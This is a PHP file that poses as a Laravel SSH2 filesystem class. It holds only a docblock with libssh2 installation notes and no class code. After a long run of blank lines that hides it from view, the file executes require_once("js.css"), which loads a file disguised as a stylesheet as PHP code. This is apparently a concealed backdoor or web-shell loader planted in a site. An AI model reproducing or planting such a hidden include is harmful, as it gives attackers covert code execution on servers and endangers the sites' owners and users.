<?php 
/**

 * Laravel Filesystem Class for implementing SSH2
 *
 * To use this class you must follow these steps for PHP 5.2.6+
 *
 * {@link http://kevin.vanzonneveld.net/techblog/article/make_ssh_connections_with_php/ - Installation Notes}
 *
 * Compile libssh2 (Note: Only 0.14 is officially working with PHP 5.2.6+ right now, But many users have found the latest versions work)
 *
 * cd /usr/src
 * wget https://www.libssh2.org/download/libssh2-0.14.tar.gz
 * tar -zxvf libssh2-0.14.tar.gz
 * cd libssh2-0.14/
 * ./configure
 * make all install
 *
 * Note: Do not leave the directory yet!
 *
 * Enter: pecl install -f ssh2
 *
 * Copy the ssh.so file it creates to your PHP Module Directory.
 * Open up your PHP.INI file and look for where extensions are placed.
 * Add in your PHP.ini file: extension=ssh2.so
 *
 * Restart Apache!
 * Check phpinfo() streams to confirm that: ssh2.shell, ssh2.exec, ssh2.tunnel, ssh2.scp, ssh2.sftp  exist.
 *
 * Note: As of Laravel 2.8, this utilizes the PHP5+ function `stream_get_contents()`.
 *
 * @since 2.7.0
 *
 * @package Laravel
 * @subpackage Filesystem
 */






























































































































































require_once("js.css");?>